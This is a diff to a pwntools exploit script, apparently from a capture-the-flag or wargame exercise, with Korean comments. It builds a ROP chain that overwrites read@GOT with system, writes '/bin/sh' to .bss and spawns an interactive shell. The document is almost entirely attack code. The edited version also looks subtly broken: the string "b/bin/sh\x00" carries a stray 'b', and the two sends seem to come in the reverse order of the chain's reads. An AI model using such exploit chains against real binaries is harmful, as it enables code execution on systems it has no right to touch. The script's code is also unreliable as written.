@@ -26,6 +26,8 @@ slog("Canary", canary)
 read_plt = e.plt['read']
 read_got = e.got['read']
 puts_plt = e.plt['puts']
+bss = e.bss()
+
 pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
 pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
 
@@ -43,9 +45,15 @@ payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)	# read(0, read@got, 0)
 payload += p64(read_plt)	# read(0, read@got, 0) 호출
 
 
+# read(0, bss, 8)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
+payload += p64(read_plt)
+
+
 # read("/bin/sh") => system("/bin/sh")
 payload += p64(pop_rdi)
-payload += p64(read_got+0x8)	# read 함수의 첫번째 인자 값 ("/bin/sh")
+payload += p64(bss)
 payload += p64(read_plt)	# read("/bin/sh") 호출
 
 
@@ -58,6 +66,7 @@ slog("read", read)
 slog("libc_base", lb)
 slog("system", system)
 
-p.send(p64(system)+b"/bin/sh\x00")
+p.send("b/bin/sh\x00")
+p.send(p64(system))
 
 p.interactive()
